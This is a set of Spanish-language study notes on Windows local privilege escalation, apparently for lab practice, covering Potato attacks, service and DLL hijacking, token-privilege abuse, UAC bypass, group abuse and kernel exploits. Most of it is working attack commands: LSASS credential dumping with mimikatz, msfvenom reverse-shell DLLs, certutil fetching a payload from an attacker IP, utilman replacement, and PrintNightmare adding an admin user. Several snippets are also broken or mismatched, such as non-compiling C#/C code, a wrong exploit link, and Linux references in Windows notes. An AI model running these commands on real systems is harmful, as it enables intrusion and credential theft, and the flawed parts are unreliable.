> [!NOTE]
> La escalada de privilegios local (LPE) consiste en pasar de un usuario con bajos permisos a uno con más, típicamente **SYSTEM** o **Administrador**. Las vías principales son: abusar de privilegios del token, explotar servicios mal configurados, abusar de la pertenencia a ciertos grupos y explotar vulnerabilidades del sistema.

---
# 0. Enumeración

Para atacar un sistema Linux debemos hacernos estas preguntas:

1️⃣**¿Quienes somos? ¿Pertenecemos a algun grupo importante? ¿Tenemos algún privilegio importante?**
- Especial atención a `SeImpersonatePrivilege` con los ataques potato
- Si estamos en un grupo de administradores, utilizar tecnicas de UACBypass

2️⃣**¿Cuál es la versión del sistema?** A lo mejor es vulnerable a ataques del kernel
- Usar `sherlock` o `exploit-suggester`

3️⃣**¿Qué servicios corren?**
- ¿Hay algun servicio con la ruta sin entrecomillar?
- ¿Hay algun servicio con un ejecutable sobre escribible?
- ¿Tenemos acceso a modificar algun servicio?

4️⃣**¿Hay alguna credencial harcodeada?**
- Utilizar `LaZagne`, `SharpUp`
- Buscar en el unnatend, el autologon o en archivos de configuración
- Buscar en las cookies o el portapapeles con `cookieextractor`, `SharpChromoum` o `Invoke-Clipboard`

Para ello utilizaremos principalmente de `Winpeas.exe` y `SharpUp`. Para enumerar servicios corriendo usaremos `pspy`. 


---------
# 1. 🥔 Ataques Potato e Impersonación

 Las cuentas de servicio como `IIS AppPool\DefaultAppPool` o `NT SERVICE\MSSQLSERVER` tienen `SeImpersonatePrivilege` por diseño. Este privilegio permite a un proceso **usar el token de otro usuario** que se conecte a él.  Generalmente, los procesos hacen esto realizando una llamada al proceso WinLogon para obtener un token de SYSTEM

> [!CAUTION]
En los ataques Potato, el atacante obliga a un servicio COM privilegiado (normalmente SYSTEM) a responder a un endpoint RPC o Named Pipe que él controla. Gracias a `SeImpersonatePrivilege`,  consigue un token SYSTEM de esa respuesta.

O tambien darle este permiso desde `secpol.msc`: `Directivas locales 🡆 Asignación de derechos de usuario 🡆 Cargar y descargar controladores de dispositivo 🡆 añadimos al usuario`

| Ataque        | Versiones vulnerables                                                                    |
| ------------- | ---------------------------------------------------------------------------------------- |
| Hot Potato    | Windows 7 <br>Windows Server 2008 R2 y anteriores sin parches de junio de 2016           |
| Rotten Potato | Windows 7, Windows 8/8.1, Windows 10 Build 1607/1709<br>Windows Server 2008 R2/2012/2016 |
| Juicy Potato  | Windows 7, 8.1 y Windows 10 hasta **1809**<br>Windows Server 2008 R2, 2012 R2,           |
| Rogue Potato  | Windows Server 2016-2019 <br>Windows 10 **1809+**                                        |
| PrintSpoofer  | Windows 10 (requerie servicio `Print Spooler`)<br>Windows Server 2016-2019               |
| EfsPotato     | Windows 10 <br>Windows Server 2016-2022                                                  |
| GodPotato     | Windows 8/10/11 antes de los parches de Microsoft (2023) <br>Windows Server 2012-2022    |

Tenemos:

> [!WARNING]
> **Hot Potato**: Se aprovecha del servicio WPAD, que permite descubrir automáticamente la configuración de proxy en redes corporativas. Por tanto, mediante un fichero de configuración malicioso (WPAD.dat), obligaba a este servicio a autenticarse localmente y reutilizar dicha autenticación a SMB para ejecutar acciones privilegiadas (NTLM-Relay).

> [!WARNING]
**Rotten Potato**: La técnica hacía que un servicio COM ejecutado como SYSTEM iniciara una autenticación RPC/NTLM.  El atacante se colocaba en medio de esa comunicación con un falso OXID Resolver en el puerto 6666, y reenviaba parte del intercambio hacia el resolver real.  En el camino, el proceso atacante conseguía el token privilegiado.
> > LonelyPotato: Es una variante de RottenPotato pensada para conseguir el mismo tipo de abuso, pero sin depender de Metasploit/Meterpreter.

> [!WARNING]
> **EFSPotato**: En este caso, se abusa de EFSRPC, la interfaz RPC relacionada con el servicio Encrypting File System. El atacante provoca que un servicio privilegiado se conecte a un Named Pipe controlado por él y, si tiene privilegios de impersonación, puede adoptar el token de ese cliente privilegiado. 

-------
## 1.1. JuicyPotato (2018) - Windows 2007 - 2016

> [!WARNING]
Como las versiones más nuevas de Windows limitaron el abuso clásico del puerto 6666, JuicyPotato buscaba CLSID concretos que pudieran crear objetos COM que se ejecutaran con privilegios altos y provocaran una autenticación RPC susceptible de impersonación. Luego hacía que estos objetos se autenticara contra un named pipe controlado por él atacante y obtener el token. Con este token puede crear un proceso como la cmd como SYSTEM

El atacante sube a la máquina el programa `JuicyPotato.exe`
```
.\jp.exe -t * -p C:\windows\system32\cmd.exe -a "/c net user Administrator 12345678" -l 9001
```
Si falla, puede que con el parámetro `-c` tengamos que indicar un CLSID porque el que prueba de por sí está mal, lo podemos obtener de [aqui](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)


------
## 1.2. RoguePotato (2020) - Windows server 2019

> [!WARNING]
Mejora de JuicyPotato para sistemas donde no hay CLSIDs locales explotables (Windows server 2019).  En vez de depender del OXID Resolver local de la misma forma que Rotten/JuicyPotato, RoguePotato usa un OXID Resolver controlado por el atacante, normalmente en otra máquina. Las peticiones OXID se redirigen hacia ese resolver falso y luego se encaminan hacia el resolver real, por ejemplo mediante socat.

Primero hay que  redirigir el puerto 135 de kali al puerto 9999 del windows victima (el por defecto del exploit)
```c
Kali: sudo socat tcp-listen:135,reuseaddr,fork tcp:<ip_windows>:9999
Windows: .\RoguePotato.exe -r <kali_ip> -e "<command>" -l 9999
```


-------
## 1.3 PrintSpoofer (2020)

Abusa del Printer Bug (`MS-RPRN`) para forzar a SYSTEM a conectarse a un Named Pipe controlado. 

> [!WARNING]
PrintSpoofer: En vez de centrarse en DCOM/OXID, abusa del Print Spooler. El atacante crea un Named Pipe controlado por él (`\\.\pipe\atacante\pipe\spoolss`) y fuerza al servicio de impresión, que corre como SYSTEM, a conectarse a ese pipe. Como el spooler corre como SYSTEM, captura su token via impersonación

Primero hay que  redirigir el puerto 135 de kali al puerto 9999 del windows victima (el por defecto del exploit)
```
PrintSpoofer.exe -c "<comando>"
```


--------
## 1.3. GodPotato (2023) - Windows actual

> [!WARNING]
Abusa de la interfaz **IMarshal** de COM para forzar a SYSTEM a conectar a un pipe controlado, sin depender de CLSIDs específicos ni del spooler. Funciona en prácticamente todas las versiones modernas.

Para explotarlo se descarga la herramienta [godpotato](https://github.com/BeichenDream/GodPotato/releases). 
```bash
# 1. Ver para que versión instalar godpotato
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"

# 2. Ejecutar el exploit
GodPotato.exe -cmd "<comando>"
```


----
# 2. ⚙️ Vulnerabilidades en Servicios

Creamos un servicio vulnerable 
```cpp
using System.ServiceProcess;  
using System.Threading;  
  
class VulnSvc : ServiceBase { protected override void OnStart(string[] _) {  
    new Thread(() => { Thread(()=>Thread.Sleep(Timeout.Infinite)).Start(); 
    static void Main()=>Run(new WeakSvc{ServiceName="VulnSvc"}); }
```

Se compila, se crea el servicio y le damos permisos
```bash
# 1. Se compila
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:./vuln.exe

# 2. Se asigna un binario que ejecutar
sc create VulnSvc binpath= "C:\Program Files\vuln\vuln.exe" start= auto

# 3. Se dan permisos a su ruta para el usuario del atacante
icacls C:\Program Files\vuln /grant jessica:(OI)(CI)F /T
```


#### 🔎 Enumeración

```powershell
# Enumerar servicios corriendo como sistema
gwmi Win32_Service | ? { $_.State -eq "Running" -and $_.StartName -eq "LocalSystem" } | select Name, DisplayName 

& sc.exe qc <servicio> # Ver como arranca y que binario ejecuta
cmd /c "taskkill /F /IM 'C:\Program Files\vuln\vuln.exe'" # pararlo
cmd /c "net start VulnSvc" # reiniciarlo

# Vemos si tenemos permisos sobre el servicio: ALL_ACCESS o CHANGE_CONFIG
cmd /c ".\accesschk -accepteula -ucv Jessica VulnSvc"

# Vemos es escribible
cmd /c '.\accesschk.exe -accepteula -u Jessica "C:\Program Files\vuln\vuln.exe"'

# Ver las claves de servicio escribibles
accesschk64.exe /accepteula -s <usuario> -kvuqw hklm\System\CurrentControlSet\services

# Ver binarios con permisos
.\SharpUp.exe audit
```

----
## 2.1. Permisos débiles en el ejecutable del servicio

Si el ejecutable que lanza un servicio tiene permisos de escritura para usuarios no privilegiados, se puede sustituir por uno malicioso. Al reiniciar el servicio (o el sistema), el código del atacante corre con los privilegios de la cuenta del servicio.

Si tenemos permisos sobre el ejecutable
```bash
.\accesschk.exe -accepteula -u Jessica "C:\Program Files\vuln\vuln.exe"
copy ./vuln.exe "C:\Program Files\vuln\vuln.exe" /Y # O sobrescribirlo
sc start vuln
```

Si tenemos permisos sobre el servicio
```bash
accesschk.exe -accepteula -quvcw vuln
sc config vuln binpath= "./vuln.exe" # Cambiar el ejecutable
sc stop vuln 
sc start vuln
```

O si tenemos permisos sobre el registro
```bash
accesschk.exe /accepteula -u Jessica -kvuqsw hklm\System\CurrentControlSet\services
reg add HKLM\SYSTEM\CurrentControlSet\services\vuln /v ImagePath /t REG_EXPAND_SZ /d <ruta_malware> /f
```

- Un servicio que corre como system vulnerable es el Update Orchestrator Service (UsoSvc) - CVE-2019-1322

------
## 2.2. Unquoted service path
 
Cuando la ruta del ejecutable de un servicio contiene espacios y **no está entre comillas**, Windows la interpreta de forma ambigua. Prueba las siguientes rutas en orden hasta encontrar un ejecutable:

```
Ruta correcta:     C:\Program Files\Mi Servicio\app.exe
Orden de búsqueda: C:\Program.exe > C:\Program Files\Mi.exe > C:\Program Files\Mi Servicio\app.exe
```

Para encontrar servicios sin comillas
```
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Por tanto, el atacante enumera si tiene permisos en `C:\Program Files\` y sube el malware como `Mi.exe`. Al reiniciar el servicio, Windows ejecuta `Mi.exe` antes de llegar al binario real.

------
## 2.3. Autoruns

Un autorun es un programa que se ejecuta automáticamente al iniciar el sistema. Esto es porque lo define el registro de Windows con la clave: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

Por tanto para el escenario, creamos un servicio vulnerable que se ejecute automátc
```powershell
copy C:\Windows\System32\calc.exe C:\Program Files\Autoruns\calc.exe

reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Vuln /t REG_SZ /d C:\Program Files\Autoruns\calc.exe /f
```

Para la explotación
```bash
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
# AutorunSvc
copy <malware> <ruta_ejecutable> /Y
# Al reiniciar el sistema se ejecutará nuestro malware
```


------
## 2.4. DLL Hijacking

Cuando un proceso busca una DLL, Windows la busca en este orden:

```
[Carpeta del ejecutable] 🡆 [C:\Windows\System32\] 🡆 [C:\Windows\System\] 🡆 [C:\Windows\] 🡆 [carpeta actual] 🡆 [%PATH%]
```

- Si el atacante puede escribir en alguna ruta que se consulta **antes** de donde está la DLL real, puede plantar una DLL maliciosa que se cargará en el proceso.
- Si se ve que se llama a una DLL que no existe, como `test.dll`, se puede crear una maliciosa con ese nombre

 La DLL maliciosa
 - **DllMain**, es el punto de entrada que se llama cuando se carga y descarga la DLL, ul_reason_for_call indica por qué se llamó a DllMain.
```c
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain( HMODULE h, DWORD r, LPVOID l ) { if(r==DLL_PROCESS_ATTACH): system("whoami"); return 1; }
```
O sin system:
```c
DWORD WINAPI t(LPVOID p){ system("whoami > C:\\Temp"); return 0; }  
BOOL WINAPI DllMain(HMODULE h,DWORD r,LPVOID l){ if(r==1) CreateThread(0,0,t,0,0,0); return 1; }
```
- Con metasploit `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<puerto> -f dll -o evil.dll`

Por tanto la compilamos `x86_64-w64-mingw32-gcc WTF.cpp --shared -o test.DLL`


---
# 3. 🔑 Abuso de Privilegios del Token

> [!WARNING]
Cuando se tiene acceso a un token con ciertos privilegios habilitados, se pueden usar directamente para escalar. 

Ver qué privilegios tiene el usuario actual: `whoami /priv`. 

Si un privilegio está desactivado, podremos activarlo con [este script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell
Import-Module .\Enable-Privilege.ps1 
.\EnableAllTokenPrivs.ps1 
```

------
## 3.1. SeDebugPrivilege

> [!CAUTION]
Permite abrir cualquier proceso con acceso total a su memoria, independientemente de sus permisos. Con esto se puede inyectar código en `lsass.exe` o en cualquier proceso SYSTEM.

Con este privilegio podemos aaceder a la SAM volcando la memoria de LSASS
```powershell
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp # volcar lsass con procdump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full # con rundll
```

Luego con mimikatz o pypikatz (Linux) se obtienen las contraseñas de ese archivo
```bash
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit # Windows
# Si no, usar mimikatz # lsadump::secrets
pypykatz lsa minidump ./lsass.dmp # Linuz
```

> GUI: `Administrador de Tareas 🡆 Details 🡆 LSASS 🡆 Create dump file`

> [!NOTE]
> Tambien podemos obtener RCE con `SeDebugPrivilege` lanzando un proceso hijo y heredar el token de un proceso padre que se ejecuta como SYSTEM.

Utilizaremos el script de este [repo](https://github.com/decoder-it/psgetsystem)
```powershell
(Get-Process ¨"lssass").Id # Pid lsass, ej 612
PS> . .\psgetsys.ps1 
PS> ImpersonateFromParentPid -ppid 612 -command 'C:\Windows\System32\cmd.exe' -cmdargs ""
```


------
## 3.2. SeBackupPrivilege

> [!CAUTION]
Permite leer cualquier archivo ignorando sus ACLs, como si se estuviera haciendo un backup. Con esto se puede leer la SAM, el SYSTEM hive y el NTDS.dit.

Tenemos que clonar este [repositorio](https://github.com/giuliano108/SeBackupPrivilege) y subirlo a la máquina para habilitar el privilegio en la sesión actual y copiar los hives
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll 
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege # Habilitar el privilegio en la sesión actual
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

reg save HKLM\system system & reg save HKLM\sam sam # Copiar las hives
reg save HKLM\security security # Opcional, claves de máquina y de usuario para DPAPI.
impacket-secretsdump -system SYSTEM -sam SAM LOCAl  # Acceder al registro
# -security security
```

Diskshadow:
```powershell
diskshadow.exe 
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
```

Podemos romper contraseñas cifradas con `DPAPI` con mimikatz
```bash
cmd: mimikatz.exe 'dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect' 'exit'
```
 

------
## 3.3. SeRestorePrivilege

> [!CAUTION]
Permite escribir en cualquier archivo ignorando sus ACLs. Se puede usar para sobrescribir ejecutables del sistema o archivos de configuración.

En este caso sobrescribimos un binario del sistema con un payload
```
Copy-FileSeRestorePrivilege .\payload.exe C:\Windows\System32\utilman.exe
```

------
## 3.4. SeTakeOwnershipPrivilege

> [!CAUTION]
Permite apropiarse de cualquier objeto del sistema (archivo, clave de registro, servicio...) convirtiéndose en su propietario, y luego modificar su DACL para darse permisos. Esto es porque se asigna derechos WRITE_OWNER sobre un objeto

En este caso sobrescribimos un binario del sistema con un payload
```powershell
takeown /f C:\Windows\System32\utilman.exe
cmd /c "icacls C:\Windows\System32\utilman.exe"
copy C:\Windows\System32\utilman.exe ./utilman.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

Podemos leer backups de claves del registro: `%WINDIR%\repair\sam` o `%WINDIR%\system32\config\security.sav`, archivos de base de datos como `.kdbx`, archivos como contraseña `pass`, scripts... etc
```powershell
icacls C:\Windows\System32\archivo.exe /grant %username%:F # Dar permisos completos
```

------
## 3.5. SeLoadDriverPrivilege

> [!CAUTION]
Permite cargar drivers en el kernel. Si se puede cargar un driver malicioso o vulnerable, se tiene ejecución de código en modo kernel (ring 0).

> Máquina vulnerable: https://archive.org/details/win10-1607

1. Se descarga [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp) , se elimina la linea `"#include "stdafx.h` y se compila en `x64 release`
2. Descargamos este repositorio de [capcom](https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)) en zip y compilamos lo de la carpeta "Exploit Capcom"
3. Descargamos capcom.sys, un driver con una vuln para permitir a cualquiera ejecutar shellcode como SYSTEM
```powershell
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom .\Capcom.sys
.\ExploitCapcom.exe reverse.exe
```

La manera larga es subirlo y modificar el registro
1. Compilar [EnableSeLoadDriverPrivilege.cpp](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) añadiendo las lineas `#include <stdio.h>` y `#include "tchar.h"` 
2. Descargar  [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) y la herramienta [ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
```bash
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
.\ExploitCapcom.exe reverse.exe
```
> La sintaxis extraña `\??\` usada para referenciar el ImagePath de nuestro driver malicioso es una ruta de objeto NT. La API de Win32 analizará y resolverá esta ruta para localizar y cargar correctamente nuestro driver malicioso.


---
# 4. UAC Bypass

El UAC o "User Access Control" es una ventana que se abre cuando se quiere usar los privilegios del administrador temporalmente para realizar una acción privilegiada. Esto hace que si un atacante utiliza una shell, no pueda acceder a esta ventana.

El UAC puede estar en estos modos

| Nivel de UAC                                                                | Secure "Freezed" Desktop | Programas de terceros se instalan o hacen cambios | Programas de Windows hacen cambios | Seguridad |
| --------------------------------------------------------------------------- | :----------------------: | :-----------------------------------------------: | :--------------------------------: | --------- |
| **Always Notify **                                                          |            ✅             |                         ✅                         |                 ✅                  | 🟢        |
| **Notify me only when apps try to make changes**                            |            ✅             |                         ✅                         |                 ❌                  | 🟠        |
| **Notify me only when apps try to make changes without dimming my desktop** |            ❌             |                         ✅                         |                 ❌                  | 🟡        |
| **Never Notify** (Desactivado)                                              |            ❌             |                         ❌                         |                 ❌                  | 🔴        |


Para ver el nivel del UAC y la version de compilación de nuestro sistema, podemos ejecutar:
```c
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
/v ConsentPromptBehaviorAdmin
#  ConsentPromptBehaviorAdmin    REG_DWORD    0x5 -> Mivel más alto
[environment]::OSVersion.Version
# 10     0      14393  0
```

> [!CAUTION]
Pues bien, hay ciertos componentes especiales, ciertos programas o objetos COM, que se saltan la comprobación. Las técnicas de UAC Bypass ejecutan esos procesos y los engañan para aprovecharse de la ventaja y ejecutar comandos maliciosos.

Técnicas
- **Registry Hijacking / DLL Hijacking:** carga claves de registro o dlls maliciosas en programas que se autoelevan como `fodhelper.exe`
- **Elevated COM Interfaces:** Se abusa de objetos COM configurados para auto-aprovar la escalada de privilegios sin pedir permiso al usuario
- **Windows Directory Mocking:**  Se coloca código malicioso en sitios donde procesos del sistema que se auto elevan buscan encontrar archivos legitimos.


----
## 4.1 Usando fodhelper o computerdefaults
Con `fodhelper.exe`

```
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
```

Usando `computerdefaults.exe`:
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

------
## 4.2 UACME

Descargamos este [repo]([https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME) y lo compilamos con las opciones en `Project 🡆 Properties 🡆 General` `Windows 10 SDK` y `Platform ToolSet v145`

Y ejecutamps `.\Akagi64.exe <modo> .\reverse.exe`

Tambien tenemos este [script](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Bypass-UAC.ps1)


------------
## 4.3 DLL inyection

> [!CAUTION]
Podemos hacer una inyección de DLL en un programa como `SystemPropertiesAdvanced.exe`, el cual trata de cargar la DLL `srrstr.dll` de la función `System Restore`. **Este programa se autoeleva sin saltar el UAC.**

Para cargar DLLS Windows utiliza por orden de propidad 
```
El directorio del programa 🡆 System32 🡆 Windows 🡆 PATH
```

Por tanto, podemos buscar en el PATH directorios con permisos de escritura.
```bash
PS> cmd /c echo %PATH%
# (...)
# C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;

kali: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10.10 LPORT=8443 -f dll > srrstr.dll

PS> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```


---
# 5. 👥 Abuso de Grupos

Ciertos grupos de Windows tienen capacidades especiales que, bien abusadas, permiten escalar privilegios sin necesitar un exploit.

| **Group**               | **Description**                                                                                                                                                                             |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Default Administrators  | Domain Admins y Enterprise Admins son "súper" grupos.                                                                                                                                       |
| Server Operators        | Pueden iniciar y detener servicios, acceder a recursos compartidos SMB y hacer copias de seguridad de archivos.                                                                             |
| Backup Operators        | Pueden hacer copias shadow de la base de datos SAM (`SeBackupPrivilege` y `SeRestorePrivilege`), tambien leer el registro de forma remota y acceder al sistema de archivos a través de SMB. |
| Print Operators         | Pueden engañar a windows para cargar un driver malicioso                                                                                                                                    |
| Account Operators       | Los miembros pueden modificar cuentas y grupos no protegidos en el dominio.                                                                                                                 |
| Remote Desktop Users    | Pueden acceder por RDP gracias al permiso `Allow Login Through Remote Desktop Services`                                                                                                     |
| Remote Management Users | Los miembros pueden iniciar sesión en los DCs con PSRemoting (evil-winrm)                                                                                                                   |
| DNS Admins              | Pueden crear DLLs maliciosas o registros WPAD                                                                                                                                               |

------
## 4.1. Remote Management Users (WinRM)

Permiten conectarse via WinRM/PowerShell Remoting. Útil para movimiento lateral sin necesidad de RDP.
```powershell
Enter-PSSession -ComputerName <objetivo> -Credential <usuario>
Invoke-Command -ComputerName <objetivo> -ScriptBlock { whoami }
```

------
## 4.2. DnsAdmins

> [!CAUTION]
Pueden cargar un plugin DLL en el servicio DNS (`dns.exe`), que corre como SYSTEM en el DC.

La gestión de DNS se realiza sobre RPC. La herramienta `dnscmd`) nos permite cargar un DLL personalizado sin ninguna verificación de la ruta del DLL. Esto modifica la clave: `HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`

```c
KALI: msfvenom -p windows/x64/exec cmd='whoami' -f dll -o adduser.dll
# net group "domain admins" netadm /add /domain
WINDOWS: certutil -split -urlcache -f http://10.10.14.244/adduser.dll ./adduser.dll
WINDOWS: dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
WINDOWS: sc stop dns; sc start dns
WINDOWS: net group "Domain Admins" /dom
```

> Si hacemos `sc.exe sdshow DNS`, buscamos si nuestro usuario tiene los permisos `RPWP` que le permitan resetearlo.

> [!CAUTION]
Tambien podemos abusar del registro WPAD ( Protocolo de Descubrimiento Automático de Proxy Web) y el ISATAP (Protocolo de Direccionamiento Automático de Túneles Intra-sitio). Esto es porque podemos  deshabilitar la seguridad de la lista de bloqueo de consultas globales (global query block list) para ambos protocolos en un servidor DNS.

```bash
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
Luego creamos un registro WPAD malicioso para redirigir a nuestra máquina el tráfico con `Responder` o `Inveigh`

------
## 4.3. Event Log Readers

> [!CAUTION]
Pueden leer los logs de seguridad. Aunque no es escalada directa, puede revelar credenciales en texto claro en logs de PowerShell, comandos ejecutados, o patrones de autenticación.

```bash
# Puede buscar credenciales en logs de powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | ? { $_.Message -match "password|pass|cred" }

# O enumerar usuarios válidos con logins fallidos (4625)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | select -First 20
```

------
## 4.4. Administradores de Hyper-V

> [!CAUTION]
Si un DC está virtualizado, los Administradores de virtualización serán considerados Domain admins

- Pueden crear un clon del DC y montar el disco virtual para obtener acceso al NTDS.dit
- Al eliminar una máquina virtual `vmms.exe` restaura los permisos del archivo `.vhdx` como SYSTEM. Podemos eliminar este archivo y crear un hard link para que apunte a un archivo de sistema protefido.

Un ejemplo de esto es Firefox, que instala el servicio Mozilla Maintenance Service. Podemos actualizar este exploit (una prueba de concepto para enlaces duros de NT) para conceder a nuestro usuario actual permisos completos sobre el siguiente archivo: `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

```bash
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
# Luego se remplaza por uno malicioso
sc.exe start MozillaMaintenance
```

> Nota: Este vector ha sido mitigado por las actualizaciones de seguridad de Windows de marzo de 2020, que cambiaron el comportamiento relacionado con los enlaces duros.

------
## 4.5. Print Operators

> [!CAUTION]
Este grupo otorga el privilegio `SeLoadDriverPrivilege`, derechos para administrar, crear, compartir y eliminar impresoras conectadas a un DC, así como la capacidad de iniciar sesión localmente en un DC y apagarlo. 

Por tanto es la misma explotación que con `SeLoadDriverPrivilege`. Para que se active el privilegio, aunque salga Disabled, hay que ejecutar una shell con privilegios, por tanto habrá que evadir el UAC.

------
## 4.6. Server Operators

> [!CAUTION]
El grupo Operadores de servidor permite a sus miembros administrar servidores Windows sin necesidad de que se les asignen privilegios de Domain Admin. Es un grupo con privilegios muy elevados que puede iniciar sesión localmente en los servidores, incluidos los DC

La pertenencia a este grupo confiere los potentes privilegios `SeBackupPrivilege` y `SeRestorePrivilege` y la capacidad de controlar los servicios locales.

Podemos usar el visor/controlador de servicios [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), que forma parte de la suite Sysinternals, para comprobar los permisos del servicio
```bash
c:\Tools\PsService.exe security AppReadiness # All
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
sc stop AppReadiness & sc start AppReadiness
```

---
# 5. Exploits de kernel

- Si tenemos acceso a un sistema y es vulnerable a EternalBlue (MS17-010). pero el puerto 445 no es accesible desde el exterior, podríamos ser capaces de escalar privilegios si hacemos port forwarding

| **Vuln**                                    | Exploit                                                                     |
| ------------------------------------------- | --------------------------------------------------------------------------- |
| MS08-067                                    | [exploit](https://github.com/worawit/MS17-010)                              |
| MS17-010 (EternalBlue)                      | [exploit](https://github.com/helviojunior/MS17-010)                         |
| CVE-2021-36934 (HiveNightmare o SeriousSam) | [exploit](https://github.com/GossiTheDog/HiveNightmare/tree/master/Release) |

**MS08-067** – Vulnerabilidad de ejecución remota de código en el servicio **Server** por un manejo incorrecto de solicitudes RPC: permitiendo a un atacante no autenticado ejecutar código con privilegios **SYSTEM**. Vulnerable hasta Windows Server 2000/2003/2008 y Windows XP/Vista

**MS17-010 (EternalBlue)** – Vulnerabilidad de ejecución remota de código que explota un fallo en SMBv1 que permite ejecutar código como **SYSTEM** mediante paquetes especialmente diseñados.  

**ALPC Task Scheduler 0-Day** – Fallo en el endpoint ALPC del servicio **Task Scheduler**, que permitía modificar DACL en archivos `.job` de `C:\Windows\Tasks`. Un atacante podía crear un _hard link_ hacia un archivo controlado y, mediante la API `SchRpcSetSecurity`, secuestrar una DLL a través del servicio **Spooler**, obteniendo ejecución como **NT AUTHORITY\SYSTEM**. 

------------
# 5.1. HiveNightmare - Serious SAM

> [!CAUTION]
**CVE-2021-36934 (HiveNightmare o SeriousSam)** – Vulnerabilidad de Windows 10 que permitía a cualquier usuario leer partes críticas del Registro, independientemente de sus privilegios.

Para explotar HiveNightmare necesitamos que haya shadow copies del disco.

Tenemos este [PoC]([https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe)) para copiar los _hives_ **SAM**, **SYSTEM** y **SECURITY** 
```bash
cmd> .\HiveNightmare.exe
kali: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```


-------
# 5.2. PrintNightmare

> [!CAUTION]
Es un fallo de `RpcAddPrinterDriver` que se utiliza para permitir la impresión remota y la instalación de controladores en el servicio de cola de impresión (Print Spooler) sin requerir del `SeLoadDriverPrivilege`. Esto le daba al atacante privilegios de SYSTEM

El peligro radica en que el Spoller se ejecuta por defecto en los DC, en Windows 7 y 10 y se corrigió con el parche de julio del 2021

Esta [implementación de PowerShell](https://github.com/calebstewart/CVE-2021-1675) se puede usar para una rápida escalada de privilegios local. 
```bash
# Comprobamos que spooler se ejecuta
ls \\localhost\pipe\spoolss

Set-ExecutionPolicy Bypass -Scope Process
. .\CVE-2021-1675.ps1 

Invoke-Nightmare -NewUser "hack" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

---------
# 5.2. CVE-2020-0668

Explota una falla de movimiento arbitrario de archivos aprovechando el Windows Service Tracing (el cual permite depuración servicios y modulos en ejecución para solucionar problemas). Este servicio se configura con claves del registro; si el parámetro `MaxFileSize` es inferior al tamaño del archivo, hace que este se renombre como `.OLD` por SYSTEM

El exploit es [este](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) y el objetivo es usarlo para escribir un archivo en System32 encandenandolo con  [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) o [DiagHub](https://github.com/xct/diaghub) para cargar la DLL y escalar nuestros privilegios. UsoDllLoader no funciona si el sistema se está actualizando.

